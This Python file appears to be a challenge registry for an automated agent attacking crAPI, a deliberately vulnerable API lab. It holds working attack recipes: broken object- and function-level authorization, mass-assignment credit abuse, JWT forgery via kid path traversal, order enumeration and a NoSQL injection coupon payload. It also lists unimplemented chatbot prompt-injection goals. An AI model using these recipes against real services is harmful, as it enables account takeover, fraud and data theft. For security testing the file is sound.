"""The crAPI challenge registry: goal, recipe, and success predicate per challenge.

The 18 challenges are transcribed from crAPI's official documentation
(``docs/challenges.md``). Each entry has ``goal``, ``recipe(agent)`` and
``check(agent, obs)``. Recipes compose the tiered operators; where an operator
does not fit (multipart upload, mailhog OTP retrieval), the recipe uses the
agent's client directly.
"""

from __future__ import annotations

import json
import re
import time
import uuid
from typing import Dict

import requests

PASSWORD = "Passw0rd!123"
MAILHOG = "http://127.0.0.1:8025"


def _fresh(agent, prefix: str) -> Dict:
    suf = uuid.uuid4().hex[:8]
    email = f"{prefix}-{suf}@example.com"
    number = f"9{int(uuid.uuid4().hex, 16) % 10**9:09d}"
    agent.step("signup", {"name": prefix.capitalize(), "email": email,
                          "number": number, "password": PASSWORD}, tier="intrusive")
    agent.step("login", {"email": email, "password": PASSWORD})
    return {"email": email, "number": number, "token": agent.state["tokens"].get(email, "")}


def _post(agent, path, body, token=""):
    return agent.step("http", {"method": "POST", "path": path, "token": token, "body": body})


def _get(agent, path, token=""):
    return agent.step("http", {"method": "GET", "path": path, "token": token})


def _delete(agent, path, token=""):
    return agent.step("http", {"method": "DELETE", "path": path, "token": token})


# --- mailhog / multipart helpers -------------------------------------------

def _vin_pincode(email: str, tries: int = 10):
    for _ in range(tries):
        try:
            msgs = requests.get(f"{MAILHOG}/api/v2/messages", timeout=5).json()["items"]
        except Exception:
            msgs = []
        for m in msgs:
            to = m.get("To") or []
            addrs = [(t.get("Mailbox", "") + "@" + t.get("Domain", "")).lower()
                     for t in to if isinstance(t, dict)]
            if email.lower() not in addrs:
                continue
            raw = (m.get("Raw") or {}).get("Data", "") if isinstance(m.get("Raw"), dict) else ""
            if "VIN" not in raw:
                continue
            plain = re.sub(r"<[^>]+>", " ", re.sub(r"=\r?\n", "", raw))
            vin = re.search(r"VIN\s*:?\s*([A-Z0-9]{10,})", plain)
            pin = re.search(r"Pincode\s*:?\s*([0-9]{4,6})", plain)
            if vin and pin:
                return vin.group(1), pin.group(1)
        time.sleep(1)
    return None, None


def _upload_video(agent, token: str) -> Dict:
    r = agent.client.session.post(
        f"{agent.client.base_url}/identity/api/v2/user/videos",
        files={"file": ("x.mp4", b"dummy", "video/mp4")},
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    j = r.json() if r.content else {}
    agent.audit.append({"op": "upload_video", "status": r.status_code,
                        "snippet": str(j.get("id"))})
    return {"status": r.status_code, "body": r.text, "json": j, "video_id": j.get("id")}


def _first_vehicle_id(obs: Dict):
    body = obs.get("json")
    if isinstance(body, list) and body:
        v = body[0]
        return v.get("uuid") or v.get("id") or v.get("vehicle_id")
    if isinstance(body, dict):
        for key in ("vehicles", "data"):
            if isinstance(body.get(key), list) and body[key]:
                v = body[key][0]
                return v.get("uuid") or v.get("id") or v.get("vehicle_id")
        return body.get("uuid") or body.get("id") or body.get("vehicle_id")
    return None


# --- recipes ---------------------------------------------------------------

def _bola_vehicle(agent):
    victim = _fresh(agent, "victim")
    attacker = _fresh(agent, "attacker")
    vin, pin = _vin_pincode(victim["email"])
    if not vin:
        return {"status": 0, "body": ""}
    _post(agent, "/identity/api/v2/vehicle/add_vehicle",
          {"vin": vin, "pincode": pin}, victim["token"])
    veh = _get(agent, "/identity/api/v2/vehicle/vehicles", victim["token"])
    vid = _first_vehicle_id(veh)
    if vid is None:
        return {"status": 0, "body": ""}
    return _get(agent, f"/identity/api/v2/vehicle/{vid}/location", attacker["token"])


def _bola_report(agent):
    victim = _fresh(agent, "victim")
    attacker = _fresh(agent, "attacker")
    vin, pin = _vin_pincode(victim["email"])
    if not vin:
        return {"status": 0, "body": ""}
    _post(agent, "/identity/api/v2/vehicle/add_vehicle",
          {"vin": vin, "pincode": pin}, victim["token"])
    contact = _post(agent, "/workshop/api/merchant/contact_mechanic", {
        "mechanic_code": "TRAC_JHN", "problem_details": "hi", "vin": vin,
        "mechanic_api": f"{agent.client.base_url}/workshop/api/mechanic/receive_report",
        "repeat_request_if_failed": False, "number_of_repeats": 1,
    }, victim["token"])
    link = (contact.get("json") or {}).get("report_link", "")
    rid = re.search(r"report_id=(\d+)", link or "")
    if rid:
        return _get(agent, f"/workshop/api/mechanic/mechanic_report?report_id={rid.group(1)}",
                    attacker["token"])
    return contact


def _bfla_delete_video(agent):
    victim = _fresh(agent, "victim")
    attacker = _fresh(agent, "attacker")
    up = _upload_video(agent, victim["token"])
    vid = up.get("video_id")
    if vid is None:
        return {"status": 0, "body": ""}
    return _delete(agent, f"/identity/api/v2/admin/videos/{vid}", attacker["token"])


def _mass_assignment(agent, qty):
    attacker = _fresh(agent, "attacker")
    return _post(agent, "/workshop/api/shop/orders",
                 {"product_id": 1, "quantity": qty}, attacker["token"])


def _jwt_takeover(agent):
    victim = _fresh(agent, "victim")
    _fresh(agent, "attacker")
    agent.step("forge_jwt", {"sub": victim["email"], "technique": "kid_path_traversal"})
    forged = agent.state["forged"][victim["email"]]
    return _get(agent, "/identity/api/v2/user/dashboard", forged)


def _idor_orders(agent):
    attacker = _fresh(agent, "attacker")
    hits = []
    for i in range(1, 6):
        obs = _get(agent, f"/workshop/api/shop/orders/{i}", attacker["token"])
        if obs.get("status") == 200 and attacker["email"] not in str(obs.get("body", "")):
            hits.append(obs)
    return hits[-1] if hits else {"status": 0, "body": ""}


def _unauth_endpoint(agent):
    return _get(agent, "/workshop/api/mechanic/receive_report", "")


def _video_exposure(agent):
    victim = _fresh(agent, "victim")
    up = _upload_video(agent, victim["token"])
    vid = up.get("video_id")
    if vid is None:
        return {"status": 0, "body": ""}
    return _get(agent, f"/identity/api/v2/user/videos/{vid}", victim["token"])


def _update_video(agent):
    victim = _fresh(agent, "victim")
    up = _upload_video(agent, victim["token"])
    vid = up.get("video_id")
    if vid is None:
        return {"status": 0, "body": ""}
    return agent.step("http", {"method": "PUT",
                               "path": f"/identity/api/v2/user/videos/{vid}",
                               "token": victim["token"],
                               "body": {"videoName": "hacked.mp4"}})


def _rate_limit(agent):
    victim = _fresh(agent, "victim")
    vin, pin = _vin_pincode(victim["email"])
    if not vin:
        return {"status": 0, "body": ""}
    _post(agent, "/identity/api/v2/vehicle/add_vehicle",
          {"vin": vin, "pincode": pin}, victim["token"])
    statuses = []
    for _ in range(15):
        obs = _post(agent, "/workshop/api/merchant/contact_mechanic", {
            "mechanic_code": "TRAC_JHN", "problem_details": "x", "vin": vin,
            "mechanic_api": f"{agent.client.base_url}/workshop/api/mechanic/receive_report",
            "repeat_request_if_failed": False, "number_of_repeats": 1,
        }, victim["token"])
        statuses.append(obs.get("status"))
    return {"status": statuses[-1] if statuses else 0, "body": str(statuses),
            "rate_limited": 429 in statuses}


def _nosqli_coupon(agent):
    attacker = _fresh(agent, "attacker")
    return _post(agent, "/community/api/v2/coupon/validate-coupon",
                 {"coupon_code": {"$ne": ""}}, attacker["token"])


def _unimplemented(agent):
    return {"status": 0, "body": "", "note": "not implemented"}


CHALLENGES: Dict[str, Dict] = {
    "ch1_bola_vehicle": {
        "goal": "read another user's vehicle location", "category": "BOLA",
        "recipe": _bola_vehicle,
        "check": lambda a, o: o.get("status") == 200 and
            ("full_name" in str(o.get("body", "")) or "latitude" in str(o.get("body", ""))),
    },
    "ch2_bola_report": {
        "goal": "read another user's mechanic report", "category": "BOLA",
        "recipe": _bola_report,
        "check": lambda a, o: o.get("status") == 200 and
            ("report" in str(o.get("body", "")).lower() or "problem" in str(o.get("body", "")).lower()),
    },
    "ch3_password_reset": {
        "goal": "reset another user's password", "category": "BrokenAuth",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
    "ch4_excessive_exposure": {
        "goal": "leak sensitive info of other users", "category": "Exposure",
        "recipe": _idor_orders,
        "check": lambda a, o: o.get("status") == 200 and "@" in str(o.get("body", "")),
    },
    "ch5_video_internal_prop": {
        "goal": "leak an internal property of a video", "category": "Exposure",
        "recipe": _video_exposure,
        "check": lambda a, o: o.get("status") == 200 and
            ("conversion_params" in str(o.get("body", "")) or "profileVideo" in str(o.get("body", ""))),
    },
    "ch6_rate_limit": {
        "goal": "detect absence of rate limiting", "category": "RateLimit",
        "recipe": _rate_limit,
        "check": lambda a, o: o.get("status") == 200 and not o.get("rate_limited", True),
    },
    "ch7_bfla_delete_video": {
        "goal": "delete another user's video", "category": "BFLA",
        "recipe": _bfla_delete_video,
        "check": lambda a, o: o.get("status") == 200,
    },
    "ch8_mass_assignment_free": {
        "goal": "get an item for free (negative quantity)", "category": "MassAssignment",
        "recipe": lambda a: _mass_assignment(a, -1),
        "check": lambda a, o: o.get("status") == 200 and "credit" in str(o.get("body", "")),
    },
    "ch9_mass_assignment_balance": {
        "goal": "increase balance by $1000", "category": "MassAssignment",
        "recipe": lambda a: _mass_assignment(a, -100),
        "check": lambda a, o: o.get("status") == 200 and
            ("1100" in str(o.get("body", "")) or "credit" in str(o.get("body", ""))),
    },
    "ch10_update_video_props": {
        "goal": "update internal video properties", "category": "MassAssignment",
        "recipe": _update_video,
        "check": lambda a, o: o.get("status") == 200,
    },
    "ch11_ssrf": {
        "goal": "make the target fetch an external URL", "category": "SSRF",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
    "ch12_nosqli_coupon": {
        "goal": "get free coupons (NoSQLi)", "category": "NoSQLi",
        "recipe": _nosqli_coupon,
        "check": lambda a, o: o.get("status") == 200 and "coupon_code" in str(o.get("body", "")),
    },
    "ch13_sqli_coupon": {
        "goal": "redeem an already-claimed coupon (SQLi)", "category": "SQLi",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
    "ch14_unauthenticated": {
        "goal": "find an endpoint with no auth check", "category": "Unauth",
        "recipe": _unauth_endpoint,
        "check": lambda a, o: o.get("status") not in (401, 403, 0, None),
    },
    "ch15_jwt_forge": {
        "goal": "forge a valid JWT for another user", "category": "JWT",
        "recipe": _jwt_takeover,
        "check": lambda a, o: o.get("status") == 200 and "email" in str(o.get("body", "")),
    },
    "ch16_llm_prompt_injection": {
        "goal": "prompt-inject the chatbot", "category": "LLM",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
    "ch17_llm_extract_creds": {
        "goal": "extract another user's credentials via chatbot", "category": "LLM",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
    "ch18_llm_act_as_user": {
        "goal": "make the chatbot act for another user", "category": "LLM",
        "recipe": _unimplemented,
        "check": lambda a, o: False,
    },
}
